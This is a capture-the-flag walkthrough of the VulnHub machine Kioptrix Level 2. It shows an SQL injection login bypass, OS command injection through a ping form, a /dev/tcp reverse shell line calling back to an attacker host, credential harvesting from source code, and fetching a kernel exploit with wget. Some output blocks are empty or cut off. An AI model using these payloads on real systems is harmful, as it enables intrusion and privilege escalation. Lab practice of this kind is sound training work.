# VulnHub: Kioptrix Level 2

The actual exploitation of Kioptrix Level 2 is really easy only if you go through proper enumeration and analyzing everything that you have. Gaining access to the machine is really simple but the main fun begins after that while escalating your privileges. 

So, let's begin!

## Initial Enumeration

For enumeration, we can get started with running an `nmap` scan and trying to access the machine via a web browser to see if some website is hosted over there.

The results of `nmap` are like

```

```

It can be seen that ports 22, 80, 111, 443, 631, 1006 and 3306 are open on the target machine. 

## Gaining Access

When we access the IP address, we can see a login page is hosted over there.

![login](./.images/login.png)

The first thing that could come to our mind after looking at this login page would be SQLi. So, we can try to pass `' OR 1=1--` as the username as well as password. As this SQLi works, we are redirected to another page from where we can ping machines on the network.

![ping](./.images/ping.png)

We can first simply try the loopback IP i.e. "127.0.0.1" to which we can get a response like

![ping_loopback](./.images/ping_loopback.png)

Now that we are sure that the `ping` command is being executed in the background, we can check if OS command Injection can be performed from here.

To test OS Command Injection, we can send simple input like "127.0.0.1; whoami" and see if the result gets reflected in the output

```
127.0.0.1; whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.547 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.79 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.141 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.141/0.827/1.794/0.703 ms, pipe 2
apache
```

On the last line, we can see that `apache` is returned. So, we can be sure that OS Command Injection can be performed over here. Through the same method we can gain a reverse shell as well by sending a command to create a reverse shell

```
127.0.0.1; sh -i >& /dev/tcp/192.168.0.164/4444 0>&1
```

And along with that we need to start a listener to get the reverse shell

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/vulnhub/kioptrix_lv2]
└─$ nc -nvlp 4444                
listening on [any] 4444 ...
connect to [192.168.0.164] from (UNKNOWN) [192.168.0.191] 32769
sh: no job control in this shell
sh-3.00$ whoami
apache
sh-3.00$ hostname
kioptrix.level2
```

Now, as this is a dumb shell we can upgrade it using the method explained over [here](https://0xnirvana.medium.com/tryhackme-convertmyvideo-eb2a1f8dd747).

## Privilege Escalation

The first thing that we can check for are the commands that our user could run with `sudo` privileges using the command `sudo -l` but it asks for password which we don't know.

The next thing that we can check is if any cronjob is running on the system

```bash
bash-3.00$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

# run-parts
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly

```

But we can't see any such suspicious cronjob running over here. 

We can also check if there are any other users on the system and if we can access their directories. 

```bash
bash-3.00$ cd /home
bash-3.00$ ls -la
total 24
drwxr-xr-x   4 root   root   4096 Oct 12  2009 .
drwxr-xr-x  23 root   root   4096 Apr 29 03:09 ..
drwx------   2 harold harold 4096 Oct 12  2009 harold
drwx------   2 john   john   4096 Oct  8  2009 john
bash-3.00$ cd harold/
bash: cd: harold/: Permission denied
bash-3.00$ cd john/
bash: cd: john/: Permission denied

```

It can be seen that there are two users on the system "harold" and "john" but we don't have access to anyone's directory.

Now, as the username is `apache` we can assume that this user is created for some web service. So, we can check the files in `var/www` directory to see if we can find some sensitive information that might help us to escalate privileges. \

If we recall, then we had found an SQLi on the `index.php` page. So, it means that it would've been connected to some database in the backend. So, we can try to read the code for `index.php` in `/var/www/html` to see we can find some useful information.

```php
bash-3.00$ cat index.php 
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");

```

And the very beginning of the file we can find MySQL login credentials for user "john". Just to check if there is a case of password reuse we can first try to switch user to "john" or "harold" using the password "hiroshima" before check the database.

```bash
bash-3.00$ su john
Password: 
su: incorrect password
bash-3.00$ su harold
Password: 
su: incorrect password
```

But it appears like there is no password reuse over here. So, we can move and see if any useful information can be obtained from the database.

```mysql
bash-3.00$ mysql -u john -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

```

It can be seen that there are 3 tables. We can check each one of them.

Beginning with table "mysql"

```bash

It can be seen that there are multiple tables in this database but the one that appears to be the most interesting is "user".

+-----------------------+------+------------------+
5 rows in set (0.00 sec)

```

Because there are a large number of columns in the table, we can select only the columns that we are interested in which are `Host, User and Password`.

From the table, we can see that for both `root` and `john` the password value is same. This password appears to be a hash and to check that we can use `hashid`

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/vulnhub/kioptrix_lv2]
└─$ hashid 5a6914ba69e02807

[+] Oracle 7-10g 
[+] FNV-164 
[+] CRC-64 
[+] Cisco-PIX(MD5) 
[+] Cisco-ASA(MD5) 
```

As per `hashid` this hash could be a MySQL323 hash. So, we can use `john` to crack this hash.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/vulnhub/kioptrix_lv2]
└─$ echo 5a6914ba69e02807 > hash

But this appears to be a rabbit hole as we got the same password that we had obtained from the `index.php` file. 

But we still have 2 more databases to explore. So, we can move on to the next database "test".

```bash
mysql> use test;
Database changed
mysql> show tables;
Empty set (0.00 sec)
```

But this database does not contain any tables so, we can move on to the next database "webapp".

```mysql

+------+----------+------------+

```

In the "webapp" database there is only one table names "users". And in that table we can see two entries each for "admin" and "john". On checking the password values with `hashid` no result was obtained, which means that both these values might be the actual password. So, we can try to use these password to switch user. Again, there is no user named "admin" on the machine so we can try to check each password with username "john", "harold" and "root".

But sadly, none of the passwords work for any of the usernames. So, this entire database thing turned out to be a rabbit hole. We can now check details of the system to find any exploit related to the OS or kernel.

IT can be seen that system is running on CentOS 4.5 (Linux Version 2.6.9-55.EL). So, we can look for exploits associated with this.

The first link when we google for *"CentOS 4.5 exploit"* leads us to this [exploit](https://www.exploit-db.com/exploits/9542). We can download it on our machine and then send it to the target machine using a python server and `wget`. And run it as per the steps mentioned in the exploit itself.

```bash
bash-3.00$ wget http://192.168.0.164:8000/9542.c
--04:12:24--  http://192.168.0.164:8000/9542.c

```

And by running just a simple exploit script, we got the access to the machine as `root`!

## Some Key Points to Take Away

1. Always take a look at the details of the system while performing initial enumeration of the system for privilege escalation.
